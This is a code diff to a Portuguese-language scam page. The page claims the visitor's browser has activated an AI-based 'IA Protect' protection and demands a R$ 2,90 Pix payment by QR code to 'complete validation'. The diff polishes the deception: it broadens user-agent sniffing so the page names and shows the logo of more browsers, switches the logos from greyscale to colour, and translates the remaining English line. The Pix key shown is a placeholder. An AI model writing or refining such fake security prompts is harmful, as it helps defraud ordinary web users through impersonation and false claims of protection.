@@ -14,7 +14,7 @@
       flex-direction: column;
       align-items: center;
       padding: 1rem;
-      line-height: 1.7;
+      line-height: 1.8;
     }
 
     header {
@@ -36,7 +36,7 @@
 
     main {
       text-align: center;
-      max-width: 600px;
+      max-width: 640px;
       margin-top: 3rem;
     }
 
@@ -44,31 +44,31 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 10px;
+      gap: 12px;
       margin-bottom: 1.5rem;
     }
 
     .icon {
-      height: 40px;
-      width: 40px;
+      height: 42px;
+      width: 42px;
       object-fit: contain;
-      filter: grayscale(100%);
+      filter: none;
     }
 
     h1 {
       font-size: 1.6rem;
       font-weight: 600;
-      margin-bottom: 1rem;
+      margin-bottom: 1.2rem;
     }
 
     p {
       font-size: 1rem;
-      margin: 0.75rem 0;
+      margin: 1rem 0;
     }
 
     .highlight {
       font-weight: bold;
-      margin: 1.5rem 0 0.5rem;
+      margin: 2rem 0 1rem;
     }
 
     .qr {
@@ -102,7 +102,7 @@
     .footer-note {
       font-size: 0.85rem;
       color: #666;
-      margin-top: 1.5rem;
+      margin-top: 1.8rem;
     }
   </style>
 </head>
@@ -124,7 +124,7 @@
   <p>O navegador <strong id="browser-name">seu navegador</strong> ativou o protocolo IA Protect — tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a validação e garantir estabilidade e proteção durante a navegação, conclua o procedimento:</p>
 
-  <p class="highlight">IA Protect operates under $0.55 USD internationally<br>Valor único em Real: <strong>R$ 2,90</strong></p>
+  <p class="highlight">IA Protect opera por menos de $0.55 USD internacionalmente<br>Valor único em Real: <strong>R$ 2,90</strong></p>
 
   <div class="qr">
     <img src="https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey" alt="QR Code Pix" />
@@ -138,27 +138,30 @@
 <script>
   const browserLogo = document.getElementById("browser-logo");
   const browserName = document.getElementById("browser-name");
-  const ua = navigator.userAgent.toLowerCase();
+  const ua = navigator.userAgent;
 
-  if (ua.includes("chrome") && !ua.includes("edg")) {
-    browserName.textContent = "Google Chrome";
-    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/732/732228.png";
-  } else if (ua.includes("firefox")) {
-    browserName.textContent = "Mozilla Firefox";
-    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/5968/5968710.png";
-  } else if (ua.includes("edg")) {
-    browserName.textContent = "Microsoft Edge";
-    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/882/882730.png";
-  } else if (ua.includes("safari") && !ua.includes("chrome")) {
-    browserName.textContent = "Safari";
-    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/732/732217.png";
-  } else if (ua.includes("opera") || ua.includes("opr")) {
-    browserName.textContent = "Opera";
-    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/5968/5968940.png";
-  } else {
-    browserName.textContent = "seu navegador";
-    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/545/545705.png";
+  let name = "seu navegador";
+  let logo = "https://cdn-icons-png.flaticon.com/512/545/545705.png";
+
+  if (/chrome|chromium|crios/i.test(ua) && !/edg/i.test(ua)) {
+    name = "Google Chrome";
+    logo = "https://cdn-icons-png.flaticon.com/512/732/732228.png";
+  } else if (/firefox|fxios/i.test(ua)) {
+    name = "Mozilla Firefox";
+    logo = "https://cdn-icons-png.flaticon.com/512/5968/5968710.png";
+  } else if (/edg/i.test(ua)) {
+    name = "Microsoft Edge";
+    logo = "https://cdn-icons-png.flaticon.com/512/882/882730.png";
+  } else if (/safari/i.test(ua) && !/chrome|crios|fxios/i.test(ua)) {
+    name = "Safari";
+    logo = "https://cdn-icons-png.flaticon.com/512/732/732217.png";
+  } else if (/opr\//i.test(ua) || /opera/i.test(ua)) {
+    name = "Opera";
+    logo = "https://cdn-icons-png.flaticon.com/512/5968/5968940.png";
   }
+
+  browserName.textContent = name;
+  browserLogo.src = logo;
 
   function copyPix() {
     const pixText = document.getElementById("pix-code").innerText;
